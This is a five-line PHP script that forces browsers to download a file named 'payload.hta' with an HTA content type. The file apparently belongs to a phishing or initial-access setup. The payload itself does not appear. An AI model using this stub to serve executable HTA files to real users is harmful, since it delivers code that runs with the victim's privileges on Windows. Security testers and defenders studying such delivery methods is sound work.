<?php
header('Content-Type: application/hta');
header('Content-Disposition: attachment; filename="payload.hta"');
readfile('payload.hta');
?>